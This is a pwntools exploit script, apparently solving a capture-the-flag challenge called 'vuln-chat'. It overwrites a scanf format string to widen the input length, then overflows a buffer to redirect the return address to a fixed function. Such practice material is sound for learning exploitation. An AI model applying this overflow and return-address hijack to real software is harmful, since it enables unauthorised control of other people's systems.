from pwn import *

# Establish the target process
target = process('./vuln-chat')

# Print the initial text
print(target.recvuntil("username: "))

# Form the first payload to overwrite the scanf format string
payload0 = b'\x00'*0x14 + b'%11s' # Fill up space to format string

# Send the payload with a newline character
target.sendline(payload0)

# Print the text up to the second scanf call
print(target.recvuntil("I know I can trust you?"))

# From the second payload to overwrite the return address
payload1 = ""
payload1 = b'\x01'*0x31 + p32(0x804856b)# Filler space to return address

# Send the second payload with a newline character
target.sendline(payload1)

# Drop to an interactive shell to view the rest of the input
target.interactive()
